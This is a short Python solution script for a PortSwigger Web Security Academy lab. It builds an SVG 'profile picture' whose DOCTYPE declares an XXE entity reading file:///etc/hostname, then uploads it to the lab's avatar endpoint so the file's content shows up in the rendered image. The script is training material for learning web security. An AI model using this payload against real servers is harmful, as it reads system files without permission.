"""
Lab 8: Exploiting XXE via image file upload
https://portswigger.net/web-security/xxe/lab-xxe-exploiting-xxe-via-image-file-upload
Difficulty: Practitioner

📝 SVG is just XML — upload a "profile picture" that's actually an SVG
carrying a DOCTYPE/XXE payload. The server's image-processing step (reading
dimensions, generating a thumbnail, etc.) parses it as XML even though the
upload UI treats it as a picture.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
UPLOAD_PATH = "/my-account/avatar"  # confirm exact path from the account page form


def build_malicious_svg(entity_value="file:///etc/hostname"):
    return f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "{entity_value}"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>"""


def run():
    s = get_session()

    svg = build_malicious_svg()
    out_path = "avatar.svg"
    with open(out_path, "w") as f:
        f.write(svg)
    log(f"Wrote malicious SVG to {out_path}")

    with open(out_path, "rb") as f:
        r = s.post(f"{TARGET}{UPLOAD_PATH}", files={"avatar": ("avatar.svg", f, "image/svg+xml")})
    log(f"Upload response status: {r.status_code}")

    note("After upload, view the resulting avatar image on the account page —")
    note("the file content should render as visible text inside the image")
    note("itself (that's what the <text> element in the SVG is for).")


if __name__ == "__main__":
    run()
